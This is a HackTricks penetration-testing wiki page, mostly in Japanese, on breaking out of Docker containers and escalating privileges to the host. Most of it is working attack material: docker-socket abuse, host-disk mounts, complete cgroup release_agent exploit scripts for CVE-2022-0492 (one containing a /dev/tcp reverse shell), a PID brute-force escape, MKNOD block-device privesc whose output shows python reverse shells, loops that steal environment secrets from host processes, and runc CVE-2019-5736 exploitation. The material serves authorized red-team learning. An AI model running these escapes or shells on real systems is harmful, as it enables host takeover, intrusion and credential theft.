# Docker Breakout / Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## Automatic Enumeration & Escape

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): コンテナを**列挙**することもできます
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): このツールは、あなたがいるコンテナを**列挙**し、自動的にエスケープを試みるのに非常に**便利**です
* [**amicontained**](https://github.com/genuinetools/amicontained): コンテナが持つ権限を取得し、そこからエスケープする方法を見つけるための便利なツール
* [**deepce**](https://github.com/stealthcopter/deepce): コンテナから列挙し、エスケープするためのツール
* [**grype**](https://github.com/anchore/grype): 画像にインストールされているソフトウェアに含まれるCVEを取得します

## Mounted Docker Socket Escape

もし何らかの理由で**dockerソケットがコンテナ内にマウントされている**ことがわかれば、そこからエスケープすることができます。\
これは通常、何らかの理由でアクションを実行するためにdockerデーモンに接続する必要があるdockerコンテナで発生します。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
この場合、通常のdockerコマンドを使用してdockerデーモンと通信できます：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
予期しない場所に**dockerソケット**がある場合でも、**`docker`**コマンドを使用して**`-H unix:///path/to/docker.sock`**パラメータで通信できます。
{% endhint %}

Dockerデーモンは、[ポートでリッスンしている可能性があります（デフォルトは2375、2376）](../../../../network-services-pentesting/2375-pentesting-docker.md) またはSystemdベースのシステムでは、Systemdソケット`fd://`を介してDockerデーモンと通信できます。

{% hint style="info" %}
さらに、他の高レベルランタイムのランタイムソケットにも注意してください：

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities Abuse Escape

コンテナの能力を確認する必要があります。以下のいずれかを持っている場合、そこから脱出できる可能性があります：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE`、`CAP_SYS_RAWIO`、`CAP_SYSLOG`、`CAP_NET_RAW`、`CAP_NET_ADMIN`**

現在のコンテナの能力は、**前述の自動ツール**を使用するか、次の方法で確認できます：
```bash
capsh --print
```
以下のページでは、**Linuxの能力**について学び、それを悪用して特権を逃れたり昇格させたりする方法を学ぶことができます：

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## 特権コンテナからの脱出

特権コンテナは、フラグ `--privileged` を使用するか、特定の防御を無効にすることで作成できます：

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

`--privileged` フラグはコンテナのセキュリティを大幅に低下させ、**制限のないデバイスアクセス**を提供し、**いくつかの保護を回避**します。詳細な内訳については、`--privileged` の完全な影響に関するドキュメントを参照してください。

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 特権 + hostPID

これらの権限を使用すると、**ホストでrootとして実行されているプロセスの名前空間に移動する**ことができます。例えば、init (pid:1) に対して、次のコマンドを実行します： `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

コンテナ内で次のコマンドを実行してテストしてください：
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

privilegedフラグを使用するだけで、**ホストのディスクにアクセス**したり、**release\_agentや他のエスケープを悪用してエスケープを試みる**ことができます。

次のバイパスをコンテナで実行してテストしてください:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### ディスクのマウント - Poc1

適切に構成されたdockerコンテナでは、**fdisk -l**のようなコマンドは許可されません。しかし、`--privileged`または`--device=/dev/sda1`のフラグが指定された誤った構成のdockerコマンドでは、ホストドライブを見るための権限を取得することが可能です。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

したがって、ホストマシンを乗っ取るのは簡単です：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
そして、これで！ホストのファイルシステムにアクセスできるようになりました。これは`/mnt/hola`フォルダーにマウントされています。

#### ディスクのマウント - Poc2

コンテナ内で、攻撃者はクラスターによって作成された書き込み可能なhostPathボリュームを介して、基盤となるホストOSへのさらなるアクセスを試みるかもしれません。以下は、この攻撃者ベクターを利用できるかどうかを確認するためにコンテナ内でチェックできる一般的な項目です：
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 特権エスケープ 既存の release\_agent を悪用する ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="初期 PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### 特権エスケープ 作成された release\_agent を悪用する ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="第二の PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**技術の説明**は以下にあります：

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### 特権のエスケープ release\_agentを相対パスを知らずに悪用する - PoC3

前のエクスプロイトでは、**ホストのファイルシステム内のコンテナの絶対パスが開示されます**。しかし、これは常にそうではありません。ホスト内のコンテナの**絶対パスがわからない場合**は、この技術を使用できます：

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
特権コンテナ内でPoCを実行すると、次のような出力が得られるはずです：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 特権エスケープ：センシティブマウントの悪用

いくつかのファイルがマウントされており、**基盤となるホストに関する情報**を提供する可能性があります。中には、**何かが発生したときにホストによって実行されるべき何かを示す**ものもあります（これにより攻撃者はコンテナから脱出することができます）。\
これらのファイルの悪用により、以下が可能になる場合があります：

* release\_agent（以前に説明済み）
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

ただし、このページで確認するための**他のセンシティブファイル**を見つけることができます：

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 任意のマウント

いくつかの状況では、**コンテナにホストからマウントされたボリュームがある**ことがわかります。このボリュームが正しく構成されていない場合、**センシティブデータにアクセス/変更する**ことができるかもしれません：秘密を読み取る、ssh authorized\_keysを変更する…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation with 2 shells and host mount

もしあなたが**コンテナ内でのrootアクセス**を持ち、ホストからマウントされたフォルダがあり、**非特権ユーザーとしてホストにエスケープし**、マウントされたフォルダに対して読み取りアクセスを持っている場合。\
あなたは**コンテナ内のマウントされたフォルダ**に**bash suidファイル**を作成し、**ホストから実行**して特権昇格を行うことができます。
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

もしあなたが**コンテナ内でrootとしてアクセス**でき、**非特権ユーザーとしてホストにエスケープ**している場合、コンテナ内でMKNODの権限があれば（デフォルトで持っています）、両方のシェルを利用して**ホスト内でのprivesc**を行うことができます（この投稿で**説明されています**）。\
そのような権限を持つと、コンテナ内のrootユーザーは**ブロックデバイスファイルを作成**することが許可されます。デバイスファイルは、**基盤となるハードウェアとカーネルモジュールにアクセスするために使用される特別なファイル**です。例えば、/dev/sdaブロックデバイスファイルは、**システムディスク上の生データを読み取る**ためのアクセスを提供します。

Dockerは、コンテナ内でのブロックデバイスの誤用を防ぐために、**ブロックデバイスの読み書き操作をブロックする**cgroupポリシーを強制しています。それにもかかわらず、もしブロックデバイスが**コンテナ内で作成されると**、それは**/proc/PID/root/**ディレクトリを介してコンテナの外部からアクセス可能になります。このアクセスには、**プロセスの所有者がコンテナ内外で同じである必要があります**。

**Exploitation**の例はこの[**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)からです：
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

ホストのプロセスにアクセスできる場合、それらのプロセスに保存されている多くの機密情報にアクセスできるようになります。テストラボを実行します:
```
docker run --rm -it --pid=host ubuntu bash
```
例えば、`ps auxn`のようなコマンドを使用してプロセスをリストし、コマンド内の機密情報を検索することができます。

次に、**/proc/内のホストの各プロセスにアクセスできるため、envシークレットを盗むことができます**。
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
他のプロセスのファイルディスクリプタに**アクセスし、それらのオープンファイルを読み取る**こともできます:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
あなたはまた、**プロセスを終了させてDoSを引き起こす**ことができます。

{% hint style="warning" %}
もしあなたが何らかの方法で**コンテナ外のプロセスに対して特権のあるアクセスを持っている**なら、`nsenter --target <pid> --all`や`nsenter --target <pid> --mount --net --pid --cgroup`のようなコマンドを実行して、**そのプロセスと同じns制限**（できればなし）**でシェルを実行することができます。**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
もしコンテナがDocker [ホストネットワーキングドライバー（`--network=host`）](https://docs.docker.com/network/host/) で構成されている場合、そのコンテナのネットワークスタックはDockerホストから隔離されておらず（コンテナはホストのネットワーキングネームスペースを共有します）、コンテナには独自のIPアドレスが割り当てられません。言い換えれば、**コンテナはすべてのサービスをホストのIPに直接バインドします**。さらに、コンテナは**ホストが送受信しているすべてのネットワークトラフィックを傍受することができます** `tcpdump -i eth0`。

例えば、これを使用して**ホストとメタデータインスタンス間のトラフィックを傍受し、さらには偽装する**ことができます。

以下の例のように：

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

また、ホスト内の**localhostにバインドされたネットワークサービス**にアクセスしたり、**ノードのメタデータ権限**（コンテナがアクセスできるものとは異なる場合があります）にアクセスすることもできます。

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true`を設定すると、ホストのプロセス間通信（IPC）リソース、例えば`/dev/shm`の**共有メモリ**にアクセスできます。これにより、他のホストやポッドプロセスが使用している同じIPCリソースに対して読み書きが可能になります。これらのIPCメカニズムをさらに調査するには、`ipcs`を使用してください。

* **/dev/shmを調査** - この共有メモリの場所にあるファイルを探します: `ls -la /dev/shm`
* **既存のIPC施設を調査** – `/usr/bin/ipcs`を使用して、使用中のIPC施設があるか確認できます。次のコマンドで確認してください: `ipcs -a`

### 権限の回復

もしシステムコール**`unshare`**が禁止されていなければ、すべての権限を回復できます:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### ユーザー名前空間のシンボリックリンクを利用した悪用

投稿[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)で説明されている2番目の技術は、ユーザー名前空間を使用してバインドマウントを悪用し、ホスト内のファイルに影響を与える方法を示しています（この特定のケースでは、ファイルを削除します）。

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVE

### Runcの脆弱性 (CVE-2019-5736)

`docker exec`をrootとして実行できる場合（おそらくsudoを使用）、CVE-2019-5736を悪用してコンテナから特権を昇格させることを試みます（エクスプロイト[こちら](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。この技術は基本的に、**コンテナからホストの_**/bin/sh**_バイナリを**上書き**しますので、docker execを実行する誰もがペイロードをトリガーする可能性があります。

ペイロードを適宜変更し、`go build main.go`でmain.goをビルドします。生成されたバイナリは実行のためにdockerコンテナに配置する必要があります。\
実行時に`[+] Overwritten /bin/sh successfully`と表示されたら、ホストマシンから以下を実行する必要があります：

`docker exec -it <container-name> /bin/sh`

これにより、main.goファイルに存在するペイロードがトリガーされます。

詳細情報については：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
コンテナが脆弱である可能性のある他のCVEもあります。リストは[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)で見つけることができます。
{% endhint %}

## Dockerカスタムエスケープ

### Dockerエスケープサーフェス

* **名前空間:** プロセスは名前空間を介して**他のプロセスから完全に分離されるべき**であり、名前空間のために他のプロセスと相互作用してエスケープすることはできません（デフォルトではIPC、Unixソケット、ネットワークサービス、D-Bus、他のプロセスの`/proc`を介して通信できません）。
* **ルートユーザー**: デフォルトでは、プロセスを実行しているユーザーはルートユーザーです（ただし、その特権は制限されています）。
* **能力**: Dockerは以下の能力を残します：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **システムコール**: これらは**ルートユーザーが呼び出すことができない**システムコールです（能力が不足しているため + Seccomp）。他のシステムコールを使用してエスケープを試みることができます。

{% tabs %}
{% tab title="x64システムコール" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 システムコール" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
